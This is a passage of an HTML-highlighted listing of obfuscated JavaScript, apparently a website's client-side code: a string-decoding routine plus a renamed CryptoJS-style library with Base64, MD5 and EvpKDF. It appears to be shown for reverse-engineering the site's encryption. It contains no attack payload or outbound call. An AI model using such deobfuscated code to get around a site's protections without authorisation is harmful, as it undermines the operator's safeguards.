-<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>, -<span class="number">2</span>],</span><br><span class="line">        <span class="attr">_baseLink</span>: <span class="string">&quot;120112130113220101010101011201011201121313220101&quot;</span>,</span><br><span class="line">        <span class="attr">_basefunction</span>: <span class="keyword">function</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="keyword">switch</span> (e = <span class="number">2</span> * e,</span><br><span class="line">            str_1 = <span class="variable language_">this</span>.<span class="property">_baseLink</span>[e],</span><br><span class="line">            str_2 = <span class="variable language_">this</span>.<span class="property">_baseLink</span>[e + <span class="number">1</span>],</span><br><span class="line">            result = <span class="string">&quot;&quot;</span>,</span><br><span class="line">            result = t.<span class="title function_">substring</span>(<span class="number">0</span>, str_2),</span><br><span class="line">            <span class="built_in">parseInt</span>(str_1)) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="attr">_mlq</span>:</span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">_base</span> += <span class="variable language_">this</span>.<span class="property">_baseTables</span>[result];</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> _mlq + <span class="attr">_zmmn</span>:</span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">_base</span> += <span class="variable language_">this</span>.<span class="property">_baseTable</span>[result];</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="attr">default</span>:</span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">_base</span> += result</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> t.<span class="title function_">substring</span>(<span class="variable language_">this</span>.<span class="property">_baseLink</span>[e + <span class="number">1</span>])</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    n.<span class="property">_baseLink</span> = n.<span class="property">_baseLink</span>[_lyydw + _nnuy](<span class="string">&quot;&quot;</span>),</span><br><span class="line">    n.<span class="property">_baseTable</span> = n.<span class="property">_baseTable</span>[_muzz + _jggu](<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = t + r; i &lt; n.<span class="property">_baseLink</span>.<span class="property">length</span> / (_nux + _nuz); i++)</span><br><span class="line">        e = n.<span class="title function_">_basefunction</span>(i, e);</span><br><span class="line">    <span class="keyword">return</span> n.<span class="property">_base</span></span><br><span class="line">&#125;;</span><br><span class="line">!<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    _hqjl = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> e = <span class="string">&quot;rAt&quot;</span></span><br><span class="line">          , t = <span class="string">&quot;rAt&quot;</span></span><br><span class="line">          , r = <span class="string">&quot;gth&quot;</span></span><br><span class="line">          , n = <span class="string">&quot;len&quot;</span></span><br><span class="line">          , i = <span class="string">&quot;str&quot;</span></span><br><span class="line">          , o = <span class="string">&quot;sub&quot;</span></span><br><span class="line">          , a = <span class="string">&quot;str&quot;</span></span><br><span class="line">          , s = <span class="string">&quot;str&quot;</span></span><br><span class="line">          , c = <span class="string">&quot;str&quot;</span></span><br><span class="line">          , l = <span class="string">&quot;sub&quot;</span></span><br><span class="line">          , h = <span class="string">&quot;gth&quot;</span></span><br><span class="line">          , u = <span class="string">&quot;in&quot;</span></span><br><span class="line">          , p = <span class="string">&quot;erse&quot;</span></span><br><span class="line">          , f = <span class="string">&quot;rev&quot;</span></span><br><span class="line">          , d = <span class="string">&quot;lit&quot;</span></span><br><span class="line">          , _ = <span class="string">&quot;sp&quot;</span></span><br><span class="line">          , y = <span class="string">&quot;gth&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> _nus = -<span class="number">705100</span>,</span><br><span class="line">        _cac = <span class="number">705102</span>,</span><br><span class="line">        _lqo = <span class="number">121771</span>,</span><br><span class="line">        _sycv = -<span class="number">447488</span>,</span><br><span class="line">        _ptm = <span class="number">834104</span>,</span><br><span class="line">        _qkta = -<span class="number">834104</span>,</span><br><span class="line">        _csr = <span class="number">671648</span>,</span><br><span class="line">        _kiq = -<span class="number">671646</span>,</span><br><span class="line">        _dwuh = -<span class="number">79794</span>,</span><br><span class="line">        _wrp = <span class="number">518838</span>,</span><br><span class="line">        _thb = <span class="number">716406</span>,</span><br><span class="line">        _qax = -<span class="number">716405</span>,</span><br><span class="line">        _bgi = <span class="number">979402</span>,</span><br><span class="line">        _tts = -<span class="number">979402</span>,</span><br><span class="line">        _vwjb = <span class="number">715885</span>,</span><br><span class="line">        _ebah = <span class="number">607613</span>,</span><br><span class="line">        _hppv = <span class="title class_">Object</span>(),</span><br><span class="line">        <span class="keyword">function</span>(<span class="params">g, v, m</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> k, w, b, S, B, x, C, A = <span class="string">&quot;str&quot;</span>, D = <span class="string">&quot;sub&quot;</span>, R = <span class="string">&quot;cha&quot;</span>, z = <span class="string">&quot;str&quot;</span>, T = <span class="string">&quot;sub&quot;</span>, P = <span class="string">&quot;cha&quot;</span>, F = <span class="string">&quot;sub&quot;</span>, E = <span class="string">&quot;rAt&quot;</span>, K = <span class="string">&quot;cha&quot;</span>, j = <span class="string">&quot;sub&quot;</span>, O = <span class="string">&quot;rAt&quot;</span>, L = <span class="string">&quot;cha&quot;</span>, M = <span class="string">&quot;len&quot;</span>, I = <span class="string">&quot;jo&quot;</span>, H = <span class="string">&quot;len&quot;</span>, X = <span class="string">&quot;str&quot;</span>, q = <span class="string">&quot;sub&quot;</span>, W = <span class="number">774547</span>, J = -<span class="number">774547</span>, N = -<span class="number">493875</span>, Q = <span class="number">493875</span>, V = -<span class="number">121770</span>, U = -<span class="number">742534</span>, G = <span class="number">742535</span>, Y = -<span class="number">439955</span>, $ = <span class="number">439956</span>, Z = <span class="number">784672</span>, ee = -<span class="number">784672</span>, te = <span class="number">447488</span>, re = <span class="number">884634</span>, ne = -<span class="number">884634</span>, ie = <span class="number">79795</span>, oe = -<span class="number">518837</span>, ae = -<span class="number">166886</span>, se = <span class="number">166887</span>, ce = -<span class="number">715883</span>, le = -<span class="number">607612</span>;</span><br><span class="line">            <span class="keyword">if</span> (_hppv[g])</span><br><span class="line">                <span class="keyword">return</span> _hppv[g];</span><br><span class="line">            <span class="keyword">for</span> (k = v + m,</span><br><span class="line">            w = <span class="string">&quot;&quot;</span>,</span><br><span class="line">            b = <span class="string">&quot;&quot;</span>,</span><br><span class="line">            S = g,</span><br><span class="line">            g = g[q + X](le + _ebah, g[H + y] - (ce + _vwjb)),</span><br><span class="line">            g = g[_ + d](<span class="string">&quot;&quot;</span>)[f + p]()[I + u](<span class="string">&quot;&quot;</span>),</span><br><span class="line">            B = g[M + h],</span><br><span class="line">            x = _tts + _bgi; B &gt; x; ++x)</span><br><span class="line">                x % k == k - (se + ae) &amp;&amp; (b = g[l + c](B - x - (_qax + _thb), k),</span><br><span class="line">                b = b[L + O](k - (oe + _wrp)) + b[j + s](ie + _dwuh, k - (_kiq + _csr)) + b[K + E](_qkta + _ptm),</span><br><span class="line">                b = b[F + a](ne + re, v),</span><br><span class="line">                w += b);</span><br><span class="line">            <span class="keyword">return</span> C = B % k,</span><br><span class="line">            C != te + _sycv &amp;&amp; (b = g[o + i](ee + Z, C),</span><br><span class="line">            b[n + r] != $ + Y &amp;&amp; (b = b[P + t](C - (G + U)) + b[T + z](V + _lqo, C - (_cac + _nus)) + b[R + e](Q + N)),</span><br><span class="line">            b = b[D + A](J + W, v),</span><br><span class="line">            w += b),</span><br><span class="line">            _hppv[S] = w,</span><br><span class="line">            w</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;(),</span><br><span class="line">    <span class="variable language_">window</span>[<span class="title function_">_hqjl</span>(<span class="string">&quot;yzunzgd&quot;</span>, <span class="number">4</span>, <span class="number">2</span>)] = process</span><br><span class="line">&#125;(),</span><br><span class="line"><span class="variable language_">window</span>.<span class="property">av_</span> = <span class="string">&quot;v&quot;</span>,</span><br><span class="line"><span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> e = coypJsDk</span><br><span class="line">      , t = e.<span class="property">lib</span>.<span class="property">WordArray</span>;</span><br><span class="line">    e.<span class="property">enc</span>.<span class="property">Base64</span> = &#123;</span><br><span class="line">        <span class="attr">stringify</span>: <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> t = e.<span class="property">words</span></span><br><span class="line">              , r = e.<span class="property">sigBytes</span></span><br><span class="line">              , n = <span class="variable language_">this</span>.<span class="property">_map</span>;</span><br><span class="line">            e.<span class="title function_">clamp</span>(),</span><br><span class="line">            e = [];</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; r &gt; i; i += <span class="number">3</span>)</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> o = (t[i &gt;&gt;&gt; <span class="number">2</span>] &gt;&gt;&gt; <span class="number">24</span> - <span class="number">8</span> * (i % <span class="number">4</span>) &amp; <span class="number">255</span>) &lt;&lt; <span class="number">16</span> | (t[i + <span class="number">1</span> &gt;&gt;&gt; <span class="number">2</span>] &gt;&gt;&gt; <span class="number">24</span> - <span class="number">8</span> * ((i + <span class="number">1</span>) % <span class="number">4</span>) &amp; <span class="number">255</span>) &lt;&lt; <span class="number">8</span> | t[i + <span class="number">2</span> &gt;&gt;&gt; <span class="number">2</span>] &gt;&gt;&gt; <span class="number">24</span> - <span class="number">8</span> * ((i + <span class="number">2</span>) % <span class="number">4</span>) &amp; <span class="number">255</span>, a = <span class="number">0</span>; <span class="number">4</span> &gt; a &amp;&amp; r &gt; i + <span class="number">.75</span> * a; a++)</span><br><span class="line">                    e.<span class="title function_">push</span>(n.<span class="title function_">charAt</span>(o &gt;&gt;&gt; <span class="number">6</span> * (<span class="number">3</span> - a) &amp; <span class="number">63</span>));</span><br><span class="line">            <span class="keyword">if</span> (t = n.<span class="title function_">charAt</span>(<span class="number">64</span>))</span><br><span class="line">                <span class="keyword">for</span> (; e.<span class="property">length</span> % <span class="number">4</span>; )</span><br><span class="line">                    e.<span class="title function_">push</span>(t);</span><br><span class="line">            <span class="keyword">return</span> e.<span class="title function_">join</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">parse</span>: <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> r = e.<span class="property">length</span></span><br><span class="line">              , n = <span class="variable language_">this</span>.<span class="property">_map</span></span><br><span class="line">              , i = n.<span class="title function_">charAt</span>(<span class="number">64</span>);</span><br><span class="line">            i &amp;&amp; (i = e.<span class="title function_">indexOf</span>(i),</span><br><span class="line">            -<span class="number">1</span> != i &amp;&amp; (r = i));</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = [], o = <span class="number">0</span>, a = <span class="number">0</span>; r &gt; a; a++)</span><br><span class="line">                <span class="keyword">if</span> (a % <span class="number">4</span>) &#123;</span><br><span class="line">                    <span class="keyword">var</span> s = n.<span class="title function_">indexOf</span>(e.<span class="title function_">charAt</span>(a - <span class="number">1</span>)) &lt;&lt; <span class="number">2</span> * (a % <span class="number">4</span>)</span><br><span class="line">                      , c = n.<span class="title function_">indexOf</span>(e.<span class="title function_">charAt</span>(a)) &gt;&gt;&gt; <span class="number">6</span> - <span class="number">2</span> * (a % <span class="number">4</span>);</span><br><span class="line">                    i[o &gt;&gt;&gt; <span class="number">2</span>] |= (s | c) &lt;&lt; <span class="number">24</span> - <span class="number">8</span> * (o % <span class="number">4</span>),</span><br><span class="line">                    o++</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">return</span> t.<span class="title function_">create</span>(i, o)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">_map</span>: <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;(),</span><br><span class="line"><span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">t</span>(<span class="params">e, t, r, n, i, o, a</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> e = e + (t &amp; r | ~t &amp; n) + i + a,</span><br><span class="line">        (e &lt;&lt; o | e &gt;&gt;&gt; <span class="number">32</span> - o) + t</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">r</span>(<span class="params">e, t, r, n, i, o, a</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> e = e + (t &amp; n | r &amp; ~n) + i + a,</span><br><span class="line">        (e &lt;&lt; o | e &gt;&gt;&gt; <span class="number">32</span> - o) + t</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">n</span>(<span class="params">e, t, r, n, i, o, a</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> e = e + (t ^ r ^ n) + i + a,</span><br><span class="line">        (e &lt;&lt; o | e &gt;&gt;&gt; <span class="number">32</span> - o) + t</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">i</span>(<span class="params">e, t, r, n, i, o, a</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> e = e + (r ^ (t | ~n)) + i + a,</span><br><span class="line">        (e &lt;&lt; o | e &gt;&gt;&gt; <span class="number">32</span> - o) + t</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> o = coypJsDk, a = o.<span class="property">lib</span>, s = a.<span class="property">WordArray</span>, c = a.<span class="property">Hasher</span>, a = o.<span class="property">algo</span>, l = [], h = <span class="number">0</span>; <span class="number">64</span> &gt; h; h++)</span><br><span class="line">        l[h] = <span class="number">4294967296</span> * e.<span class="title function_">abs</span>(e.<span class="title function_">sin</span>(h + <span class="number">1</span>)) | <span class="number">0</span>;</span><br><span class="line">    a = a.<span class="property">MD5</span> = c.<span class="title function_">extend</span>(&#123;</span><br><span class="line">        <span class="attr">_doReset</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">_hash</span> = <span class="keyword">new</span> s.<span class="title function_">init</span>([<span class="number">1732584193</span>, <span class="number">4023233417</span>, <span class="number">2562383102</span>, <span class="number">271733878</span>])</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">_doProcessBlock</span>: <span class="keyword">function</span>(<span class="params">e, o</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> a = <span class="number">0</span>; <span class="number">16</span> &gt; a; a++) &#123;</span><br><span class="line">                <span class="keyword">var</span> s = o + a</span><br><span class="line">                  , c = e[s];</span><br><span class="line">                e[s] = <span class="number">16711935</span> &amp; (c &lt;&lt; <span class="number">8</span> | c &gt;&gt;&gt; <span class="number">24</span>) | <span class="number">4278255360</span> &amp; (c &lt;&lt; <span class="number">24</span> | c &gt;&gt;&gt; <span class="number">8</span>)</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">var</span> a = <span class="variable language_">this</span>.<span class="property">_hash</span>.<span class="property">words</span></span><br><span class="line">              , s = e[o + <span class="number">0</span>]</span><br><span class="line">              , c = e[o + <span class="number">1</span>]</span><br><span class="line">              , h = e[o + <span class="number">2</span>]</span><br><span class="line">              , u = e[o + <span class="number">3</span>]</span><br><span class="line">              , p = e[o + <span class="number">4</span>]</span><br><span class="line">              , f = e[o + <span class="number">5</span>]</span><br><span class="line">              , d = e[o + <span class="number">6</span>]</span><br><span class="line">              , _ = e[o + <span class="number">7</span>]</span><br><span class="line">              , y = e[o + <span class="number">8</span>]</span><br><span class="line">              , g = e[o + <span class="number">9</span>]</span><br><span class="line">              , v = e[o + <span class="number">10</span>]</span><br><span class="line">              , m = e[o + <span class="number">11</span>]</span><br><span class="line">              , k = e[o + <span class="number">12</span>]</span><br><span class="line">              , w = e[o + <span class="number">13</span>]</span><br><span class="line">              , b = e[o + <span class="number">14</span>]</span><br><span class="line">              , S = e[o + <span class="number">15</span>]</span><br><span class="line">              , B = a[<span class="number">0</span>]</span><br><span class="line">              , x = a[<span class="number">1</span>]</span><br><span class="line">              , C = a[<span class="number">2</span>]</span><br><span class="line">              , A = a[<span class="number">3</span>]</span><br><span class="line">              , B = <span class="title function_">t</span>(B, x, C, A, s, <span class="number">7</span>, l[<span class="number">0</span>])</span><br><span class="line">              , A = <span class="title function_">t</span>(A, B, x, C, c, <span class="number">12</span>, l[<span class="number">1</span>])</span><br><span class="line">              , C = <span class="title function_">t</span>(C, A, B, x, h, <span class="number">17</span>, l[<span class="number">2</span>])</span><br><span class="line">              , x = <span class="title function_">t</span>(x, C, A, B, u, <span class="number">22</span>, l[<span class="number">3</span>])</span><br><span class="line">              , B = <span class="title function_">t</span>(B, x, C, A, p, <span class="number">7</span>, l[<span class="number">4</span>])</span><br><span class="line">              , A = <span class="title function_">t</span>(A, B, x, C, f, <span class="number">12</span>, l[<span class="number">5</span>])</span><br><span class="line">              , C = <span class="title function_">t</span>(C, A, B, x, d, <span class="number">17</span>, l[<span class="number">6</span>])</span><br><span class="line">              , x = <span class="title function_">t</span>(x, C, A, B, _, <span class="number">22</span>, l[<span class="number">7</span>])</span><br><span class="line">              , B = <span class="title function_">t</span>(B, x, C, A, y, <span class="number">7</span>, l[<span class="number">8</span>])</span><br><span class="line">              , A = <span class="title function_">t</span>(A, B, x, C, g, <span class="number">12</span>, l[<span class="number">9</span>])</span><br><span class="line">              , C = <span class="title function_">t</span>(C, A, B, x, v, <span class="number">17</span>, l[<span class="number">10</span>])</span><br><span class="line">              , x = <span class="title function_">t</span>(x, C, A, B, m, <span class="number">22</span>, l[<span class="number">11</span>])</span><br><span class="line">              , B = <span class="title function_">t</span>(B, x, C, A, k, <span class="number">7</span>, l[<span class="number">12</span>])</span><br><span class="line">              , A = <span class="title function_">t</span>(A, B, x, C, w, <span class="number">12</span>, l[<span class="number">13</span>])</span><br><span class="line">              , C = <span class="title function_">t</span>(C, A, B, x, b, <span class="number">17</span>, l[<span class="number">14</span>])</span><br><span class="line">              , x = <span class="title function_">t</span>(x, C, A, B, S, <span class="number">22</span>, l[<span class="number">15</span>])</span><br><span class="line">              , B = <span class="title function_">r</span>(B, x, C, A, c, <span class="number">5</span>, l[<span class="number">16</span>])</span><br><span class="line">              , A = <span class="title function_">r</span>(A, B, x, C, d, <span class="number">9</span>, l[<span class="number">17</span>])</span><br><span class="line">              , C = <span class="title function_">r</span>(C, A, B, x, m, <span class="number">14</span>, l[<span class="number">18</span>])</span><br><span class="line">              , x = <span class="title function_">r</span>(x, C, A, B, s, <span class="number">20</span>, l[<span class="number">19</span>])</span><br><span class="line">              , B = <span class="title function_">r</span>(B, x, C, A, f, <span class="number">5</span>, l[<span class="number">20</span>])</span><br><span class="line">              , A = <span class="title function_">r</span>(A, B, x, C, v, <span class="number">9</span>, l[<span class="number">21</span>])</span><br><span class="line">              , C = <span class="title function_">r</span>(C, A, B, x, S, <span class="number">14</span>, l[<span class="number">22</span>])</span><br><span class="line">              , x = <span class="title function_">r</span>(x, C, A, B, p, <span class="number">20</span>, l[<span class="number">23</span>])</span><br><span class="line">              , B = <span class="title function_">r</span>(B, x, C, A, g, <span class="number">5</span>, l[<span class="number">24</span>])</span><br><span class="line">              , A = <span class="title function_">r</span>(A, B, x, C, b, <span class="number">9</span>, l[<span class="number">25</span>])</span><br><span class="line">              , C = <span class="title function_">r</span>(C, A, B, x, u, <span class="number">14</span>, l[<span class="number">26</span>])</span><br><span class="line">              , x = <span class="title function_">r</span>(x, C, A, B, y, <span class="number">20</span>, l[<span class="number">27</span>])</span><br><span class="line">              , B = <span class="title function_">r</span>(B, x, C, A, w, <span class="number">5</span>, l[<span class="number">28</span>])</span><br><span class="line">              , A = <span class="title function_">r</span>(A, B, x, C, h, <span class="number">9</span>, l[<span class="number">29</span>])</span><br><span class="line">              , C = <span class="title function_">r</span>(C, A, B, x, _, <span class="number">14</span>, l[<span class="number">30</span>])</span><br><span class="line">              , x = <span class="title function_">r</span>(x, C, A, B, k, <span class="number">20</span>, l[<span class="number">31</span>])</span><br><span class="line">              , B = <span class="title function_">n</span>(B, x, C, A, f, <span class="number">4</span>, l[<span class="number">32</span>])</span><br><span class="line">              , A = <span class="title function_">n</span>(A, B, x, C, y, <span class="number">11</span>, l[<span class="number">33</span>])</span><br><span class="line">              , C = <span class="title function_">n</span>(C, A, B, x, m, <span class="number">16</span>, l[<span class="number">34</span>])</span><br><span class="line">              , x = <span class="title function_">n</span>(x, C, A, B, b, <span class="number">23</span>, l[<span class="number">35</span>])</span><br><span class="line">              , B = <span class="title function_">n</span>(B, x, C, A, c, <span class="number">4</span>, l[<span class="number">36</span>])</span><br><span class="line">              , A = <span class="title function_">n</span>(A, B, x, C, p, <span class="number">11</span>, l[<span class="number">37</span>])</span><br><span class="line">              , C = <span class="title function_">n</span>(C, A, B, x, _, <span class="number">16</span>, l[<span class="number">38</span>])</span><br><span class="line">              , x = <span class="title function_">n</span>(x, C, A, B, v, <span class="number">23</span>, l[<span class="number">39</span>])</span><br><span class="line">              , B = <span class="title function_">n</span>(B, x, C, A, w, <span class="number">4</span>, l[<span class="number">40</span>])</span><br><span class="line">              , A = <span class="title function_">n</span>(A, B, x, C, s, <span class="number">11</span>, l[<span class="number">41</span>])</span><br><span class="line">              , C = <span class="title function_">n</span>(C, A, B, x, u, <span class="number">16</span>, l[<span class="number">42</span>])</span><br><span class="line">              , x = <span class="title function_">n</span>(x, C, A, B, d, <span class="number">23</span>, l[<span class="number">43</span>])</span><br><span class="line">              , B = <span class="title function_">n</span>(B, x, C, A, g, <span class="number">4</span>, l[<span class="number">44</span>])</span><br><span class="line">              , A = <span class="title function_">n</span>(A, B, x, C, k, <span class="number">11</span>, l[<span class="number">45</span>])</span><br><span class="line">              , C = <span class="title function_">n</span>(C, A, B, x, S, <span class="number">16</span>, l[<span class="number">46</span>])</span><br><span class="line">              , x = <span class="title function_">n</span>(x, C, A, B, h, <span class="number">23</span>, l[<span class="number">47</span>])</span><br><span class="line">              , B = <span class="title function_">i</span>(B, x, C, A, s, <span class="number">6</span>, l[<span class="number">48</span>])</span><br><span class="line">              , A = <span class="title function_">i</span>(A, B, x, C, _, <span class="number">10</span>, l[<span class="number">49</span>])</span><br><span class="line">              , C = <span class="title function_">i</span>(C, A, B, x, b, <span class="number">15</span>, l[<span class="number">50</span>])</span><br><span class="line">              , x = <span class="title function_">i</span>(x, C, A, B, f, <span class="number">21</span>, l[<span class="number">51</span>])</span><br><span class="line">              , B = <span class="title function_">i</span>(B, x, C, A, k, <span class="number">6</span>, l[<span class="number">52</span>])</span><br><span class="line">              , A = <span class="title function_">i</span>(A, B, x, C, u, <span class="number">10</span>, l[<span class="number">53</span>])</span><br><span class="line">              , C = <span class="title function_">i</span>(C, A, B, x, v, <span class="number">15</span>, l[<span class="number">54</span>])</span><br><span class="line">              , x = <span class="title function_">i</span>(x, C, A, B, c, <span class="number">21</span>, l[<span class="number">55</span>])</span><br><span class="line">              , B = <span class="title function_">i</span>(B, x, C, A, y, <span class="number">6</span>, l[<span class="number">56</span>])</span><br><span class="line">              , A = <span class="title function_">i</span>(A, B, x, C, S, <span class="number">10</span>, l[<span class="number">57</span>])</span><br><span class="line">              , C = <span class="title function_">i</span>(C, A, B, x, d, <span class="number">15</span>, l[<span class="number">58</span>])</span><br><span class="line">              , x = <span class="title function_">i</span>(x, C, A, B, w, <span class="number">21</span>, l[<span class="number">59</span>])</span><br><span class="line">              , B = <span class="title function_">i</span>(B, x, C, A, p, <span class="number">6</span>, l[<span class="number">60</span>])</span><br><span class="line">              , A = <span class="title function_">i</span>(A, B, x, C, m, <span class="number">10</span>, l[<span class="number">61</span>])</span><br><span class="line">              , C = <span class="title function_">i</span>(C, A, B, x, h, <span class="number">15</span>, l[<span class="number">62</span>])</span><br><span class="line">              , x = <span class="title function_">i</span>(x, C, A, B, g, <span class="number">21</span>, l[<span class="number">63</span>]);</span><br><span class="line">            a[<span class="number">0</span>] = a[<span class="number">0</span>] + B | <span class="number">0</span>,</span><br><span class="line">            a[<span class="number">1</span>] = a[<span class="number">1</span>] + x | <span class="number">0</span>,</span><br><span class="line">            a[<span class="number">2</span>] = a[<span class="number">2</span>] + C | <span class="number">0</span>,</span><br><span class="line">            a[<span class="number">3</span>] = a[<span class="number">3</span>] + A | <span class="number">0</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">_doFinalize</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> t = <span class="variable language_">this</span>.<span class="property">_data</span></span><br><span class="line">              , r = t.<span class="property">words</span></span><br><span class="line">              , n = <span class="number">8</span> * <span class="variable language_">this</span>.<span class="property">_nDataBytes</span></span><br><span class="line">              , i = <span class="number">8</span> * t.<span class="property">sigBytes</span>;</span><br><span class="line">            r[i &gt;&gt;&gt; <span class="number">5</span>] |= <span class="number">128</span> &lt;&lt; <span class="number">24</span> - i % <span class="number">32</span>;</span><br><span class="line">            <span class="keyword">var</span> o = e.<span class="title function_">floor</span>(n / <span class="number">4294967296</span>);</span><br><span class="line">            <span class="keyword">for</span> (r[(i + <span class="number">64</span> &gt;&gt;&gt; <span class="number">9</span> &lt;&lt; <span class="number">4</span>) + <span class="number">15</span>] = <span class="number">16711935</span> &amp; (o &lt;&lt; <span class="number">8</span> | o &gt;&gt;&gt; <span class="number">24</span>) | <span class="number">4278255360</span> &amp; (o &lt;&lt; <span class="number">24</span> | o &gt;&gt;&gt; <span class="number">8</span>),</span><br><span class="line">            r[(i + <span class="number">64</span> &gt;&gt;&gt; <span class="number">9</span> &lt;&lt; <span class="number">4</span>) + <span class="number">14</span>] = <span class="number">16711935</span> &amp; (n &lt;&lt; <span class="number">8</span> | n &gt;&gt;&gt; <span class="number">24</span>) | <span class="number">4278255360</span> &amp; (n &lt;&lt; <span class="number">24</span> | n &gt;&gt;&gt; <span class="number">8</span>),</span><br><span class="line">            t.<span class="property">sigBytes</span> = <span class="number">4</span> * (r.<span class="property">length</span> + <span class="number">1</span>),</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">_process</span>(),</span><br><span class="line">            t = <span class="variable language_">this</span>.<span class="property">_hash</span>,</span><br><span class="line">            r = t.<span class="property">words</span>,</span><br><span class="line">            n = <span class="number">0</span>; <span class="number">4</span> &gt; n; n++)</span><br><span class="line">                i = r[n],</span><br><span class="line">                r[n] = <span class="number">16711935</span> &amp; (i &lt;&lt; <span class="number">8</span> | i &gt;&gt;&gt; <span class="number">24</span>) | <span class="number">4278255360</span> &amp; (i &lt;&lt; <span class="number">24</span> | i &gt;&gt;&gt; <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">return</span> t</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">clone</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> e = c.<span class="property">clone</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>);</span><br><span class="line">            <span class="keyword">return</span> e.<span class="property">_hash</span> = <span class="variable language_">this</span>.<span class="property">_hash</span>.<span class="title function_">clone</span>(),</span><br><span class="line">            e</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;),</span><br><span class="line">    o.<span class="property">MD5</span> = c.<span class="title function_">_createHelper</span>(a),</span><br><span class="line">    o.<span class="property">HmacMD5</span> = c.<span class="title function_">_createHmacHelper</span>(a)</span><br><span class="line">&#125;(<span class="title class_">Math</span>);</span><br><span class="line"><span class="keyword">var</span> born = <span class="keyword">function</span>(<span class="params"></span>) &#123;&#125;;</span><br><span class="line">!<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> e = coypJsDk</span><br><span class="line">      , t = e.<span class="property">lib</span></span><br><span class="line">      , r = t.<span class="property">Base</span></span><br><span class="line">      , n = t.<span class="property">WordArray</span></span><br><span class="line">      , t = e.<span class="property">algo</span></span><br><span class="line">      , i = t.<span class="property">EvpKDF</span> = r.<span class="title function_">extend</span>(&#123;</span><br><span class="line">        <span class="attr">cfg</span>: r.<span class="title function_">extend</span>(&#123;</span><br><span class="line">            <span class="attr">keySize</span>: <span class="number">4</span>,</span><br><span class="line">            <span class="attr">hasher</span>: t.<span class="property">MD5</span>,</span><br><span class="line">            <span class="attr">iterations</span>: <span class="number">1</span></span><br><span class="line">        &#125;),</span><br><span class="line">        <span class="attr">init</span>: <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">cfg</span> = <span class="variable language_">this</span>.<span class="property">cfg</span>.<span class="title function_">extend</span>(e)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">compute</span>: <span class="keyword">function</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> r = <span class="variable language_">this</span>.<span class="property">cfg</span>, i = r.<span class="property">hasher</span>.<span class="title function_">create</span>(), o = n.<span class="title function_">create</span>(), a = o.<span class="property">words</span>, s = r.<span class="property">keySize</span>, r = r.<span class="property">iterations</span>; a.<span class="property">length</span> &lt; s; ) &#123;</span><br><span class="line">                c &amp;&amp; i.<span class="title function_">update</span>(c);</span><br><span class="line">                <span class="keyword">var</span> c = i.<span class="title function_">update</span>(e).<span class="title function_">finalize</span>(t);</span><br><span class="line">                i.<span class="title function_">reset</span>();</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> l = 